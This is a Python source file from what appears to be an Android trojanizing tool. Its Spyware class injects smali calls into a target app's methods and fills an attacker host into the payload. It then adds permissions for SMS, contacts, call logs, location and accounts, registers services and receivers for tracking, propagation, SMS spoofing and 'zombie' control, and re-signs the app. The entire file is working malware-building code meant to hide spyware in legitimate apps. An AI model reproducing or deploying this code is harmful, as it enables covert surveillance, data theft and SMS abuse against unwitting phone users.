#    Copyright (C) 2015 Alexandre Teyar

# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at

# http://www.apache.org/licenses/LICENSE-2.0

# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
#    limitations under the License.

import os
import shutil
import subprocess
import sys
import time
import zipfile

from metadata import metadata
from payloads.payload import Payload
from reverse_engineer import reverse_engineer
from utils import config, logger, register

logger = logger.get_logger()


class Spyware(Payload):
    def __init__(self, args):
        Payload.__init__(self, args)
        self.rhost = self.args.rhost
        self.propagate = self.args.propagate

    def run(self):
        logger.info("disassembling...")
        logger.warning("this operation might take some time")
        reverse_engineer.disassemble(self)

        logger.info("exporting payload...")
        payload_path = self.export_payload()
        self.set_payload_settings(payload_path)

        logger.info("injecting...")
        if (os.path.isdir(self.destination)):
            dir_metadata = metadata.generate_dir_metadata(self.destination)
            self.inject_in_dir(dir_metadata)

        elif (os.path.isfile(self.destination)):
            file_metadata = metadata.generate_file_metadata(self.destination)
            self.inject(self.destination, file_metadata)

        logger.info("reassembling...")
        logger.warning("this operation might take some time")
        reverse_engineer.reassemble(self)

        logger.info("signing...")
        reverse_engineer.sign(self)

    def inject(self, file_path, file_metadata):
        """
        Inject the spyware.
        """
        buffer = []
        data = []
        valid_regs = []
        process = False

        with open(file_path, 'r') as file:
            for line in file:
                # We ignore the abstract and static methods (we need to get
                # an application context (this))
                if ((line.find(".method ") == 0) and
                    (line.find("abstract ") < 0) and
                    (line.find('static') < 0) and
                    (self.keywords[0] == '-1' or
                        any(keyword in line for keyword in self.keywords))):
                    words = line.split()
                    # Retrieving the method information from the meta-data
                    data = metadata.get_data(words[-1], file_metadata)
                    valid_regs = register.get_valid_regs(data[3], data[2])
                    # The method must have at least one free register, less
                    # than sixteen register, must not
                    # contain any monitor directive and not be alredy edited
                    if ((len(valid_regs) > 1) and (len(data[2]) < 16) and not
                       (data[4]) and not (self.name in data[5])):
                        process = True

                    buffer.append(line)

                elif ((line.find("return", 0, 20) > 0) and (process)):
                    # We mark the method as processed
                    buffer.append("\t# {0} has been injected on {1}\n".format(
                        self.name, time.strftime(
                            "%Y-%m-%d %H:%M:%S", time.gmtime())))
                    data[5].append(self.name)

                    # We initialize our spyware class with an application
                    # context
                    buffer.append(
                        "\tnew-instance {0},"
                        " Landroid/spyware/Spyware;\n".format(valid_regs[0])
                    )
                    buffer.append(
                        "\tinvoke-virtual {{p0}}, "
                        "{0}->getApplicationContext()"
                        "Landroid/content/Context;\n".format(data[0])
                    )
                    buffer.append(
                        "\tmove-result-object {0}\n".format(valid_regs[1])
                    )
                    buffer.append(
                        "\tinvoke-direct {{{0}, {1}}}, "
                        "Landroid/spyware/Spyware;-><init>"
                        "(Landroid/content/Context;)V\n".format(
                            valid_regs[0], valid_regs[1])
                    )

                    # We instantiate a spyware and hijack the app
                    buffer.append(
                        '\t.local {0}, '
                        '"launcher":Landroid/spyware/Spyware;\n'.format(
                            valid_regs[0])
                    )
                    buffer.append(
                        "\tinvoke-virtual {{{0}}}, "
                        "Landroid/spyware/Spyware;->run()V\n".format(
                            valid_regs[0])
                    )
                    buffer.append(line)

                # Resetting the vars for the next method
                elif ((line.find(".end method") == 0) and (process)):
                    data = []
                    valid_regs = []
                    process = False

                    buffer.append(line)

                else:
                    buffer.append(line)

        # Overwritting the .smali file
        with open(file_path, 'w') as file:
            for line in buffer:
                file.write(line)

    # TODO: break this funtion in 3 parts - get AM, change AM, compile AM
    def get_updated_AndroidManifest(self):
        """
        Disassemble an app using apktool to extract, edit and recompile
        the AndroidManifest.
        """
        try:
            instruction = (
                "java -jar ../libs/apktool_2.2.4.jar decode --force "
                "--no-src {} -o {}".format(
                    self.app_path,
                    os.path.join(config.TMP_FOLDER, self.app_name + "_res"))
            )
            subprocess.check_output(instruction, shell=True)

            self.add_AndroidManifest_permissions(
                os.path.join(
                    config.TMP_FOLDER, self.app_name + "_res",
                    "AndroidManifest.xml"))

            instruction = (
                "java -jar ../libs/apktool_2.2.4.jar build --force "
                "{} -o {}".format(
                    os.path.join(
                        config.TMP_FOLDER, self.app_name + "_res"),
                    os.path.join(
                        config.TMP_FOLDER, self.app_name + "-apktool.apk"))
            )
            subprocess.check_output(instruction, shell=True)

            with zipfile.ZipFile(os.path.join(
                 config.TMP_FOLDER, self.app_name + "-apktool.apk"),
                 'r') as zip_file:
                zip_file.extract(
                    "AndroidManifest.xml",
                    os.path.join(config.TMP_FOLDER))

            # Remove the "_res" folder and the apktool built app
            shutil.rmtree(os.path.join(
                config.TMP_FOLDER, self.app_name + "_res"), ignore_errors=True)
            os.remove(os.path.join(
                config.TMP_FOLDER, self.app_name + "-apktool.apk"))

            # Return the path of the updated AndroidManifest
            return os.path.join(config.TMP_FOLDER, "AndroidManifest.xml")

        except subprocess.CalledProcessError as ex:
            print("{} - {}".format(ex.returncode, ex.output.decode()))
            sys.exit(1)

    def set_payload_settings(self, payload_path):
        """
        Add the rhost and ppg to the AndroidManifest.
        """
        files = os.listdir(payload_path)

        for file in files:
            buffer = []
            file_path = os.path.join(payload_path, file)

            with open(file_path, 'r') as file:
                for line in file:
                    if (line.find("<--ATTACKER-->") >= 0):
                        buffer.append(
                            line.replace("<--ATTACKER-->", self.rhost)
                        )
                    elif (line.find("<--PROPAGATE-->") >= 0):
                        if self.propagate:
                            buffer.append(
                                line.replace("<--PROPAGATE-->", self.propagate)
                            )
                    else:
                        buffer.append(line)

            # Overwritting the .smali file
            with open(file_path, 'w') as file:
                for line in buffer:
                    file.write(line)

    # Pass a list of arguments to add
    def add_AndroidManifest_permissions(self, file_path):
        """
        Add the minimum required permissions, services and broadcastReceivers
        to the AndroidManifest.
        """
        manifest_path = os.path.abspath(file_path)
        buffer = []

        with open(manifest_path, 'r') as file:
            for line in file:
                if (line.find("<manifest ") >= 0):
                    buffer.append(line)
                    buffer.append(
                        '\t<uses-permission '
                        'android:name="android.permission.'
                        'ACCESS_COARSE_LOCATION"/>\n'
                    )
                    buffer.append(
                        '\t<uses-permission '
                        'android:name="android.permission.'
                        'ACCESS_FINE_LOCATION"/>\n'
                    )
                    buffer.append(
                        '\t<uses-permission '
                        'android:name="android.permission.'
                        'ACCESS_NETWORK_STATE"/>\n'
                    )
                    buffer.append(
                        '\t<uses-permission '
                        'android:name="android.permission.'
                        'GET_ACCOUNTS"/>\n'
                    )
                    buffer.append(
                        '\t<uses-permission '
                        'android:name="android.permission.'
                        'INTERNET"/>\n'
                    )
                    buffer.append(
                        '\t<uses-permission '
                        'android:name="android.permission.'
                        'READ_CALL_LOG"/>\n'
                    )
                    buffer.append(
                        '\t<uses-permission '
                        'android:name="android.permission.'
                        'READ_CONTACTS"/>\n'
                    )
                    buffer.append(
                        '\t<uses-permission '
                        'android:name="android.permission.'
                        'READ_PHONE_STATE"/>\n'
                    )
                    buffer.append(
                        '\t<uses-permission '
                        'android:name="android.permission.'
                        'READ_SMS"/>\n'
                    )
                    buffer.append(
                        '\t<uses-permission '
                        'android:name="android.permission.'
                        'RECEIVE_SMS"/>\n'
                    )
                    buffer.append(
                        '\t<uses-permission '
                        'android:name="android.permission.'
                        'SEND_SMS"/>\n'
                    )

                elif (line.find("<application ") >= 0):
                    buffer.append(line)
                    buffer.append(
                        '\t<service '
                        'android:name="android.spyware.'
                        'PropagateS"/>\n'
                    )
                    buffer.append(
                        '\t<service '
                        'android:name="android.spyware.'
                        'TrackerS"/>\n\n'
                    )

                    buffer.append(
                        '\t<receiver '
                        'android:name="android.spyware.'
                        'SendSMSR">\n'
                    )
                    buffer.append('\t\t<intent-filter>\n')
                    buffer.append(
                        '\t\t\t<action '
                        'android:name="android.provider.'
                        'Telephony.SMS_RECEIVED"/>\n'
                    )
                    buffer.append('\t\t</intent-filter>\n')
                    buffer.append('\t</receiver>\n')
                    buffer.append(
                        '\t<receiver '
                        'android:name="android.spyware.'
                        'SendZombieR"/>\n'
                    )
                    buffer.append(
                        '\t<receiver '
                        'android:name="android.spyware.'
                        'SpoofSMSR"/>\n\n'
                    )
                else:
                    buffer.append(line)

        # Overwritting the .smali file
        with open(manifest_path, 'w') as file:
            for line in buffer:
                file.write(line)
